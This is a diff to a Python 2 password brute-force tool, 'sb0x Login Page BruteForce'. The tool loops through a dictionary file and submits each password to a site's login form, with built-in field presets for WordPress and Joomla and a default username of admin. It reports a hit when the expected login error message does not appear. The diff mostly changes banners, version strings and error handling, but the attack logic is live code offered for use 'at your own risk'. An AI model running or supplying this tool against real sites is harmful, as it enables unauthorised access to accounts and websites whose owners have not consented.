@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #-*-coding:utf-8 -*-
-#  Copyright 2013 levi0x0 Project SiteBreaker0x
+#  Copyright 2013 levi0x0 Project sb0x Project
 #  
 #  This program is free software; you can redistribute it and/or modify
 #  it under the terms of the GNU General Public License as published by
@@ -41,7 +41,7 @@ def banner():
   print logo
   print "\t\tsb0x Login Page BruteForce"
   print "\t\t USE IT at YOUR OWN RISK!"
-  print "\t    (httPS://youtube.com/levi0x0) 2013"
+  print "\t (httPS://youtube.com/levi0x0) Copyright (c)2013"
   print "\t+-----------------------------------------+"
   
 #help
@@ -49,7 +49,7 @@ def help():
   print "\nsb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)"
   print "Options:\r"
   print "\t -h, --help dispaly help options."
-  print "\t -v, --verbose	verbose mode."
+  print "\t -v, --verbose	verbose mode on."
   print "\t -V, --VERSION	display file verison."
   print "\nUsage:"
   print "\t%s <target> <password file>\n" % (sys.argv[0])
@@ -57,7 +57,7 @@ def help():
     
   
 #Version
-version = '1.5.2'
+version = '1.0.3'
   
   
 #Random UserAgent
@@ -90,11 +90,12 @@ def main(  target, user_tag, user, pass_tag, passwords, submit_tag, submit, log_
 	
 	if search( log_err, response ):
 		if verbose:
-			print "==>User: %s Password: %s |Login Faild!" % ( user, passwords )
+			print "==>User: %s Password: %s |Login Faild!<==" % ( user, passwords )
 		else:
 			pass
 	elif search( log_err, response ) == None:
 		print "\n* Login Found!"
+		print "If the password is incorrect Check the login error message you entered"
 		print "[+]User: %s" % (user)
 		print "[+]Password: %s\n" % (passwords)
 		print "\nsb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)\n"
@@ -103,13 +104,16 @@ def main(  target, user_tag, user, pass_tag, passwords, submit_tag, submit, log_
 		print "[-]ERROR try again...."
 		sys.exit()
 		
+
 for arg in sys.argv:
 	if arg == "--help" or arg =="-h":
 	  help()
 	  sys.exit()
+
 	elif arg == "--VERSION" or arg == "-V":
-	    print "Version:%s" % version
+	    print "Version:%s\n" % version
 	    sys.exit()
+
 	elif arg == "--verbose" or arg == "-v":
 		verbose = True
 	else:
@@ -121,89 +125,99 @@ try:
 
 except:
 	print "sb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)\n"
-	print "[!]Usage: %s <target> <Dictionary File>\n" % (sys.argv[0])
+	print "[!]Usage: %s <target>/login_page.html <Dictionary File> -v\n" % (sys.argv[0])
 	sys.exit()
 
 
-banner()
-#t=values
-WordPress = False
+try:
+	banner()
 
-Joomla = False
+	WordPress = False
 
-Unk = True
+	Joomla = False
 
-ask = raw_input("[$]CMS (wordpress,joomla,None):")
+	ask = raw_input("=CMS (wordpress,joomla,None):")
 
-if ask == "wordpress" or ask == "WORDPRESS" or ask == "Wordpress":
-	WordPress = True
+	if ask == "wordpress" or ask == "WORDPRESS" or ask == "Wordpress":
+		WordPress = True
 
-elif ask == "joomla" or ask == "JOOMLA" or ask == "Jommla":
-	Joomla = True
+	elif ask == "joomla" or ask == "JOOMLA" or ask == "Jommla":
+		Joomla = True
 
-else:
-	Unk = True
+	else:
+		pass
 
-if WordPress:
-	user_tag = "log"
-	user = raw_input("* UserName (admin):") or "admin"
-	pass_tag = "pwd"
-	submit_tag = "wp-submit"
-	submit = "Log+In"
-	log_err = raw_input("* Login error:")
+	if WordPress:
+		user_tag = "log"
+		user = raw_input("* UserName (admin):") or "admin"
+		pass_tag = "pwd"
+		submit_tag = "wp-submit"
+		submit = "Log+In"
+		log_err = raw_input("* Login error:")
 
-elif Joomla:
-	user_tag = "username"
-	user = raw_input("* UserName (admin):") or "admin"
-	pass_tag = "passwd"
-	submit_tag = "submit"
-	submit = "Log+In"
-	log_err = raw_input("* Login error:")
+	elif Joomla:
+		user_tag = "username"
+		user = raw_input("* UserName (admin):") or "admin"
+		pass_tag = "passwd"
+		submit_tag = "submit"
+		submit = "Log+In"
+		log_err = raw_input("* Login error:")
 
-else:
-	user_tag = raw_input("* User TAG:")
-	user = raw_input("* UserName (admin):") or "admin"
-	pass_tag = raw_input("* Password TAG:")
-	submit_tag = raw_input("* Submit TAG:")
-	submit = raw_input("* Submit Value:")
-	log_err = raw_input("* Login error:")
+	else:
+		user_tag = raw_input("* User TAG:")
+		user = raw_input("* UserName (admin):") or "admin"
+		pass_tag = raw_input("* Password TAG:")
+		submit_tag = raw_input("* Submit TAG:")
+		submit = raw_input("* Submit Value:")
+		log_err = raw_input("* Login error:")
+
+except KeyboardInterrupt:
+	print "Bye (:"
+	sys.exit()
+
+except:
+	print "[-]got Unknown error"
+	sys.exit()
 	
 	
 try:
   files = open(passwords, 'r')
   
 except IOError:
-  print "[!]ERROR file: %s NOT FOUND Try Again!" % sys.argv[2]
+  print "! ERROR file: %s NOT FOUND Try Again!" % sys.argv[2]
   sys.exit()
 
 passw = files.readlines()
 
-print "\n[*] Target: %s" % (target)
+print "\n* Target: %s" % (target)
 
-print "[*] loaded Words: %d" % (len(passw))
+print "* loaded Words: %d" % (len(passw))
 
 if verbose:
 
-	print "[*] Verbose mode: ON"
+	print "* Verbose mode: ON"
 
 else:
-	print "[*] Verbose Mode: OFF"
+	print "* Verbose Mode: OFF"
 
-if user_tag == "log" and pass_tag == "pwd" and submit_tag == "wp-submit":
-	print "[*] CMS:Wordpress\n"
+if WordPress:
+	print "* CMS: Wordpress\n"
+if Joomla:
+	print "* CMS: Joomla\n"
 else:
-	print "[*] CMS :Unknown\n"
+	pass
 
 try:
 	for p in passw:
 		main( target, user_tag, user, pass_tag, p.replace('\n', ''), submit_tag, submit, log_err)
-	print "\n[!]Done.."
+	print "\n* Done.."
 	sys.exit()
 except KeyboardInterrupt:
-	print "[-]bye (:"
+	print "bye (:"
 	sys.exit()
 
 except:
-	print "[-]got error! ):"
+	print "- got Unknown error! ):"
 	sys.exit()
+
 #!EOF
